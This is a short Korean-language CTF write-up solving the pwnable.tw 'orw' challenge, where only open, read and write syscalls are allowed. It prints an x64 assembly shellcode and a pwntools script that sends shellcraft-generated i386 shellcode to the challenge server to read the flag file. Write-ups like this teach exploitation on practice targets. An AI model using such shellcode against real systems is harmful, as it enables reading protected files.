---
title: pwnable.tw orw풀이
published: 2022-07-01
tags: [shellcode]
category: pwn
draft: false
---

# orw
![alt text](image.png)

문제에서 open, read, write 
syscall만 허용이 된다.

![
](image-1.png)

드림핵에서 풀었던 기초적인
쉘코드 문제랑 완전 비슷하다.

shellcraft 함수를 사용해서 풀어보겠다.

![alt text](image-3.png)

x86이다.

![alt text](image-4.png)

x86 syscall table 문서 참고해서 인자 잘 넣어주면 된다.

```asm
    mov rax, 0x72672f666c616700
    push rax
    mov rax, 0x002f686f6d652f6f
    push rax
    mov rdi, rsp
    xor rsi, rsi
    xor rdx, rdx
    mov rax, 2
    syscall
    mov rdi, rax
    mov rsi, rsp
    sub rsi, 0x1000
    mov rdx, 0x1000
    mov rax, 0x0
    syscall

    mov rdi, 1
    mov rax, 0x1
    syscall

    xor rdi, rdi
    mov rax, 0x3c
    syscall    
```

전에 만들었던 x64 쉘코드인데
rax, eax 호환되는 것처럼 쉽게 생각하면 쉽게 풀 수 있다.

```python
from pwn import *
r = remote('chall.pwnable.tw', 10001)
context.arch = 'i386'

dir = "/home/orw/flag"

shellcode = shellcraft.open(dir)
shellcode += shellcraft.read('eax', 'esp', 0x30)
shellcode += shellcraft.write(1, 'esp', 0x30)

r.sendlineafter(b"Give my your shellcode:", asm(shellcode))
r.interactive()

```

